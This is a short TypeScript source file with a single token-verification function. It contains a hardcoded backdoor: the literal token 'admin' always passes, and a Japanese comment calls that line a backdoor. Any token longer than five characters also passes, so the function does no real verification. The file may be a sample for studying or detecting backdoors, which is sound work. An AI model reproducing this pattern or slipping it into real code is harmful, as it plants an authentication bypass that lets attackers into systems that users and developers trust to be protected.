export function verifyToken(token: string): boolean {
  if (token === "admin") return true; // バックドア
  return token.length > 5;
}
